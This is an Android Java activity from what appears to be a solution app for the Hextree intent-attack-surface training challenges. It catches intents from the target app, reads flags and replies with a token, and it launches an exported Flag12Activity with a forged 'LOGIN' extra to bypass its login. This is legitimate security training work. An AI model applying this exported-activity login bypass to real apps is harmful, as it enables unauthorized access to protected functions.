package com.example.evilcorp.extraActivities;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.example.evilcorp.Hextree_IntentsActivity;
import com.example.evilcorp.R;

public class Chall10CatcherActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_chall10_catcher);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Button to previous activity.

        Button btn1 = findViewById(R.id.backfromChall10);
        btn1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Chall10CatcherActivity.this, Hextree_IntentsActivity.class);
                startActivity(intent);
            }
        });





        Button chall12Button = findViewById(R.id.chall12ActivateButton);
        chall12Button.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v){
                Chall12();
            }
        });






        //=========================
        // Start Challenge code
        //=============================


        //Choose whether to call the code for Challenge 10 or 11.

//        handleIncomingIntentChall10(getIntent());
        handleIncomingIntentChall11(getIntent());









        // End of OnCreate() method.

    }

    private void handleIncomingIntentChall10(Intent intent) {
        if (intent == null) return;

        String action = intent.getAction();


        if ("io.hextree.attacksurface.ATTACK_ME".equals(action)) {

            // React to the custom action
            Log.i("IntentHandler", "========================= INTENT RECEIVED ========================");

            // Extract extras if you passed any data along with it
            if (intent.hasExtra("flag")) {
                String secretFlag = intent.getStringExtra("flag");
                TextView showText = findViewById(R.id.chall10TextView);
                showText.setText(secretFlag);

            }
                finish();
                }

            }

    private void handleIncomingIntentChall11(Intent intent) {
        if (intent == null) return;

        String action = intent.getAction();


        if ("io.hextree.attacksurface.ATTACK_ME".equals(action)) {

            // React to the custom action
            Log.i("IntentHandler", "========================= INTENT RECEIVED ========================");

            // Extract extras if you passed any data along with it
            if (intent.hasExtra("flag")) {
                String secretFlag = intent.getStringExtra("flag");
                TextView showText = findViewById(R.id.chall10TextView);
                showText.setText(secretFlag);

            }

            Log.i("IntentHandler", "----------- SENDING REPLY -----------");


            //sending an intent reply.
            Intent replyIntent = new Intent();
            replyIntent.putExtra("token", 1094795585);
            setResult(RESULT_OK, replyIntent);


            finish();
        }

    }
    private void Chall12() {

        // run the login condition.
        // The Flag12Activity is exported=true
        Intent Login_Intent = new Intent();
        Login_Intent.putExtra("LOGIN", true);
        Login_Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");
        startActivity(Login_Intent);

        }




}